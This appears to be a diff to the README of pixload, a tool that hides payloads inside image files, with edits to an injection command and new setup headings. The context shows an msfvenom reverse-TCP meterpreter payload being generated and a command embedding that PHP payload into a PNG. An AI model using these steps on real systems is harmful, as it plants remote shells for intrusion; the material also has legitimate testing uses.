@@ -39,10 +39,12 @@ $ msfvenom -p php/meterpreter_reverse_tcp \
 
 3. Inject `payload.php` into the image (i.e. png).
 ```sh
-./pixload-png -payload "$(cat payload.php)" -output payload.png
+$ pixload-png -payload "$(cat payload.php)" -output payload.png
 ```
 
 ## SETUP
+
+##### Dependencies
 
 The following Perl modules are required:
 
@@ -65,6 +67,12 @@ doas pkg install p5-GD p5-Image-ExifTool p5-String-CRC32
 
 On `OSX` please refer to [this workaround](https://github.com/chinarulezzz/pixload/issues/3)
 (thnx 2 @iosdec).
+
+##### Build and Install
+
+```sh
+make install
+```
 
 #### Docker
 
